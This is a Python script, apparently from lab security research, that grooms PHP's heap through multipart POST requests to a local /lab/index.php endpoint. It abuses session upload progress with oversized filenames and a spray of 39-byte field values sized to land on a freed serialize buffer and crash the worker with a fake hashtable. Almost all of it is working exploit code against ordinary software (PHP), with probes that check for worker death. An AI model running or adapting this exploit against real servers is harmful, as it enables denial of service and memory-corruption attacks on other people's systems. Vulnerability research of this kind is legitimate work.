#!/usr/bin/env python3
"""8083 controlled groom v2: N field parts with 39-byte values
(zend_string 24+39+1 = 64 => exactly the freed BG(serialize).data bin).
Live in $_POST through FILE_START => whichever lands on the stale chunk makes
the fake-ht arData = len(39)=0x27 => SEGV. Observer: worker death/bias rotate."""
import socket, sys, re

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
PROD_SID = "e" * 32
CONS_SID = "c" * 32

def part(name, body, filename=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts): return b"".join(parts) + b"--" + B + b"--\r\n"

def post_head(blen, keep=True):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\n"
            + ("Connection: keep-alive\r\n\r\n" if keep else "Connection: close\r\n\r\n")).encode()

class KA:
    def __init__(self): self.s = socket.create_connection((HOST, PORT), timeout=20)
    def send(self, head, body=None, timeout=120):
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)): return buf
            try: d = self.s.recv(65536)
            except socket.timeout: return buf + b"\n<TIMEOUT>"
            except ConnectionResetError: return buf + b"\n<RESET>"
            if not d: return buf + b"\n<EOF>"
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.split(b"\r\n\r\n", 1)[1].strip()
    except Exception as e:
        return f"ERR:{type(e).__name__}".encode()

def show(tag, r):
    i = r.find(b"\r\n\r\n")
    body = r[i+4:] if i >= 0 else r
    print(f"  {tag}: rawlen={len(r)} body[:200]={body[:200]!r}", flush=True)

n_spray = int(sys.argv[1]) if len(sys.argv) > 1 else 60
b0 = bias()
print(f"bias BEFORE: {b0!r}", flush=True)

ka = KA()
prod = [part(b"PHPSESSID", PROD_SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k")]
for i in range(20):
    prod.append(part(f"u{i}".encode(), b"x" * 100, filename=b"F" * 60000))
pp = pb(prod)
r1 = ka.send(post_head(len(pp)), pp)
show("producer", r1)

cons = [part(b"PHPSESSID", CONS_SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k")]
for i in range(n_spray):
    val = ("G%02d" % i).encode().ljust(39, b"P")   # 39-byte value => zend_string 64B
    cons.append(part(f"s{i}".encode(), val))
cons.append(part(b"u", b"y", filename=b"a.txt"))
cp = pb(cons)
r2 = ka.send(post_head(len(cp)), cp)
show("consumer-GROOM", r2)
ka.close()

b1 = bias()
print(f"bias AFTER:  {b1!r}", flush=True)
print(f"SAME_WORKER={b0 == b1}", flush=True)
